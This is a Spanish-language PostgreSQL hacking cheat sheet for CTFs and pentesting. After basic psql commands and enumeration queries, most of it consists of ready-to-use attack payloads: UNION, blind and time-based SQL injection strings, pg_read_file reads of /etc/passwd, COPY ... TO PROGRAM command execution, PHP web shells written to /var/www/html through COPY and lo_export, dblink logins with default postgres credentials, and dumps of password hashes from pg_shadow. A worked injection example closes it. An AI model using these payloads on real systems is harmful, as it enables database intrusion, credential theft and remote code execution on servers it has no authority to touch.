# PostgreSQL

---

Cheatsheet de PostgreSQL

PostgreSQL es un sistema de bases de datos relacional avanzado, muy usado en aplicaciones empresariales y en CTFs. Su dialecto SQL tiene funciones potentes que pueden abusarse para obtener información del sistema, leer archivos o incluso ejecutar comandos (si hay extensiones como dblink o COPY mal configuradas).
1. Comandos básicos del cliente psql
Comando interno	Descripción
\l	Lista todas las bases de datos
\c nombre_db	Conecta a otra base de datos
\dt	Lista tablas del esquema actual
\d tabla	Muestra estructura (columnas, índices, restricciones)
\du	Lista roles/usuarios
\dn	Lista esquemas
\df	Lista funciones
\dv	Lista vistas
\dx	Lista extensiones instaladas
\x	Activa/desactiva salida expandida (vertical, útil para filas largas)
\timing	Muestra tiempo de ejecución de consultas
\q	Salir
\?	Ayuda de comandos internos
\i archivo.sql	Ejecuta comandos desde un archivo
\o archivo.txt	Redirige salida a un archivo
\conninfo	Información de la conexión actual
2. Consultas SQL útiles para enumeración
Versión y configuración
sql

SELECT version();                         -- versión completa de PostgreSQL
SELECT current_setting('server_version'); -- solo número
SHOW all;                                 -- muestra todas las configuraciones
SELECT name, setting FROM pg_settings;    -- lo mismo pero en formato tabla

Base de datos actual y usuario
sql

SELECT current_database();   -- nombre de la BD actual
SELECT current_user;         -- usuario de la sesión
SELECT session_user;         -- usuario que se autenticó
SELECT inet_server_addr();   -- IP del servidor (si es visible)

Enumeración de tablas (sin usar \dt)
sql

-- Tablas en el esquema público
SELECT tablename FROM pg_tables WHERE schemaname = 'public';

-- Todas las tablas de todas las bases (acceso pg_class)
SELECT relname FROM pg_class WHERE relkind = 'r' AND relnamespace IN (SELECT oid FROM pg_namespace);

Columnas de una tabla específica
sql

SELECT column_name, data_type, is_nullable 
FROM information_schema.columns 
WHERE table_name = 'flags';

Obtener todos los nombres de columnas de todas las tablas
sql

SELECT table_name, column_name 
FROM information_schema.columns 
WHERE table_schema = 'public';

3. Funciones avanzadas (útiles en hacking)
Función	Descripción	Potencial malicioso
pg_read_file(ruta, offset, tamaño)	Lee archivos desde el servidor (solo dentro del directorio de datos o si se especifica ruta absoluta con permisos adecuados). Requiere superusuario o pg_read_server_files.	Leer /etc/passwd, archivos de configuración, claves SSH, etc.
pg_read_binary_file(ruta)	Igual que pg_read_file pero para binarios.	Obtener binarios del sistema o bases de datos.
pg_ls_dir(ruta)	Lista el contenido de un directorio.	Enumerar rutas, buscar archivos interesantes.
pg_stat_file(ruta)	Devuelve metadatos de un archivo (tamaño, permisos, fechas).	Recolección de info.
current_setting('param')	Obtiene valor de parámetro de configuración.	Puede revelar rutas de datos, logs, etc.
pg_sleep(segundos)	Retrasa la respuesta.	Inyección a ciegas basada en tiempo.
dblink_connect()	Permite conexiones remotas a otras bases. Requiere la extensión dblink.	Escalada de privilegios, conexiones internas, SQL injection a través de dblink.
COPY ... PROGRAM	Ejecuta un comando del sistema operativo y lo lee/escribe en una tabla. Requiere superusuario (o rol pg_execute_server_program).	RCE directa. Ej: COPY (SELECT '') TO PROGRAM 'id > /tmp/out.txt'
lo_export(loid, ruta)	Exporta un objeto grande (Large Object) a un archivo.	Escritura de archivos (si se puede crear LO antes).
4. Técnicas de inyección SQL específicas para PostgreSQL
Comentarios
sql

-- Comentario de línea (requiere un espacio después de --)
/* comentario bloque */

Detección de PostgreSQL

    Paylods que revelan PostgreSQL (errores típicos):
    sql

    ' AND 1::int=1 --         (cast a integer)
    ' AND 'a'::text='a' -- 
    ' AND version() IS NOT NULL -- 

Unión para extraer datos (UNION SELECT)

    Calcular número de columnas:
    sql

    ' ORDER BY 1 -- 
    ' ORDER BY 2 -- 
    ' UNION SELECT NULL, NULL, NULL -- 

    Obtener nombres de tablas:
    sql

    ' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema = 'public' -- 

    Obtener columnas:
    sql

    ' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users' -- 

    Concatenación (PostgreSQL usa || o CONCAT):
    sql

    ' UNION SELECT username || ':' || password, NULL FROM users -- 

Inyección a ciegas basada en booleanos
sql

' AND (SELECT substring(pass,1,1) FROM users WHERE name='admin') = 'a' -- 

Inyección a ciegas basada en tiempo
sql

' AND pg_sleep(5) -- 
' AND CASE WHEN (SELECT current_user = 'postgres') THEN pg_sleep(5) ELSE pg_sleep(0) END -- 

Lectura de archivos (si se tiene privilegios)
sql

-- Leer /etc/passwd
' UNION SELECT pg_read_file('/etc/passwd', 0, 1000), NULL -- 

-- Leer archivo completo (tamaño ilimitado)
SELECT pg_read_file('/var/log/postgresql/postgresql.log', 0, 1000000);

Escritura de archivos (RCE con COPY PROGRAM) – requiere superusuario
sql

-- Escribir una shell (PHP, etc.) en la web
COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO PROGRAM 'tee /var/www/html/shell.php';

-- O ejecutar comando y capturar salida
CREATE TABLE cmd_output (output text);
COPY cmd_output FROM PROGRAM 'id';
SELECT * FROM cmd_output;

Ejecución de comandos con dblink (si está instalada)
sql

-- Conectar a la propia base para lanzar consultas como superusuario
SELECT * FROM dblink('host=localhost user=postgres password=postgres dbname=postgres', 'SELECT pg_read_file(''/etc/passwd'')') AS t(line text);

Escalada a RCE mediante lo_export
sql

-- Crear un objeto grande con contenido malicioso
SELECT lo_create(12345);
INSERT INTO pg_largeobject (loid, pageno, data) VALUES (12345, 0, decode('<?php system($_GET["cmd"]); ?>', 'escape'));
-- Exportarlo a .php en un directorio web
SELECT lo_export(12345, '/var/www/html/shell.php');

5. Funciones de información del sistema
Consulta	Propósito
SELECT current_setting('data_directory');	Directorio de datos de PostgreSQL
SELECT current_setting('config_file');	Ruta del archivo postgresql.conf
SELECT * FROM pg_shadow;	Hashes de contraseñas de usuarios (solo superusuario)
SELECT usename, passwd FROM pg_user;	(similar)
SELECT * FROM pg_authid;	Información de autenticación
6. Payloads comunes para CTF / Pentesting

Extraer versión sin UNION (error-based)
sql

' AND 1=CAST(version() AS int) -- 

Leer archivos en texto claro
sql

-- Si el archivo no es muy grande
' UNION SELECT pg_read_file('/etc/passwd', 0, 2000) -- 

Listar directorios
sql

' UNION SELECT pg_ls_dir('/var/www/html') -- 

Obtener variables de entorno (desde el servidor)
sql

SELECT current_setting('block_size');   -- típico
-- No hay una función directa; se puede leer /proc/self/environ si se puede acceder con pg_read_file

Comprobar si un archivo existe (por tiempo)
sql

-- Si existe /etc/passwd, tarda 5s; si no, 0s
' AND CASE WHEN pg_read_file('/etc/passwd', 0, 1) IS NOT NULL THEN pg_sleep(5) ELSE pg_sleep(0) END -- 

7. ¿Por qué es útil este cheatsheet en hacking?

    PostgreSQL es frecuente en CTFs de nivel intermedio/avanzado, especialmente los que simulan entornos empresariales.

    Funciones de lectura de archivos permiten exfiltración de datos sensibles (claves, configuraciones, etc.) si el usuario tiene permisos elevados.

    COPY ... PROGRAM da RCE completa cuando la base se ejecuta como superusuario (o con roles específicos). Es el equivalente a xp_cmdshell en MSSQL.

    dblink puede usarse para ataques de “conexión a sí mismo” y escalar privilegios (si la conexión actual no es superusuario, se puede conectar con credenciales de postgres).

    Inyección a ciegas es muy potente porque pg_sleep permite extraer datos bit a bit tiempo.

    Conocer el dialecto exacto evita fallos en payloads (por ejemplo, concatenación con ||, no con + como en MSSQL).

8. Ejemplo práctico de ataque

Supón una vulnerabilidad de inyección SQL en un parámetro id. El atacante detecta PostgreSQL y tiene privilegios limitados pero el usuario postgres puede leer archivos.
sql

-- Obtener nombre de las tablas
id=1' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema='public' -- 

-- Encontrar columna flag
id=1' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='flags' -- 

-- Extraer flag (si está en columna 'address')
id=1' UNION SELECT address, NULL FROM flags -- 

-- Si además quiere leer /etc/passwd
id=1' UNION SELECT pg_read_file('/etc/passwd', 0, 1000), NULL -- 

Si el usuario tiene privilegios de escritura de archivos, puede subir una web shell mediante COPY PROGRAM si la base está en el mismo servidor que el servidor web.

